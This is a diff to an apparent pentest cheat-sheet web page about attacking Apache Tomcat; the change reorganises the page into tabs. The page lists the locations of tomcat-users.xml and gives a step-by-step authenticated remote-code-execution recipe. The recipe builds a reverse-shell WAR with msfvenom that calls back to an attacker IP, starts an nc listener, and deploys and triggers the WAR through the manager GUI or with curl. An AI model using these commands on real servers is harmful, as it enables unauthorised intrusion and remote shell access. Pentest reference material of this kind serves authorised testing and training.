@@ -200,14 +200,27 @@
 
 <div class="content"><hr>
 <h3 id="config-location">Config Location</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/share/tomcat9/etc/tomcat-users.xml
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/tomcat9/tomcat-users.xml
-</span></span></code></pre></div><h3 id="rce-authenicated">RCE (Authenicated)</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="rce-authenicated">RCE (Authenicated)</h3>
 <h4 id="1-create-a-war-file">1. Create a WAR file</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f war -o revshell.war
-</span></span></code></pre></div><h4 id="2-start-a-listener">2. Start a listener</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-start-a-listener">2. Start a listener</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">1337</span>
-</span></span></code></pre></div><h4 id="3a-via-manager-gui">3a. Via Manager GUI</h4>
+</span></span></code></pre></div></div>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">3a. Manager GUI</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >3b. Manager Script</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+--------------------------------------------+
 </span></span><span class="line"><span class="cl"><span class="p">|</span> Exploit                                    <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+--------------------------------------------+
@@ -215,10 +228,15 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span> 2. WAR file to deploy -&gt; Deploy            <span class="p">|</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span> 3. Click /revshell in Applications table   <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+--------------------------------------------+
-</span></span></code></pre></div><h4 id="3b-via-manager-script">3b. Via Manager Script</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -u <span class="s1">&#39;&lt;USERNAME&gt;:&lt;PASSWORD&gt;&#39;</span> http://example.com:8080/manager/text/deploy?path<span class="o">=</span>/revshell --upload-file revshell.war
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://example.com:8080/revshell
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+</div></p>
+<br>
 </div></div>
     
     <script src="/js/utils.js"></script>
